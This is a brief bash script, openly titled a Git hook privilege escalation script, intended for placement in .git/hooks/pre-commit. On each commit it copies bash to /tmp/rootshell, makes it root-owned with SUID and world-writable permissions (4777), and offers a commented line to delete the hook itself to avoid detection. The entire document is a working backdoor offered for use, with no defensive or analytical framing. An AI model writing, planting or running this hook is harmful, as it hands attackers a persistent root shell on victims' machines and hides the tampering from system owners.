#!/bin/bash
# Git hook privilege escalation script
# Place this in .git/hooks/pre-commit or similar

# Create a SUID root shell
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 4777 /tmp/rootshell

# Optional: clean up this hook to avoid detection
# rm -f "$0"
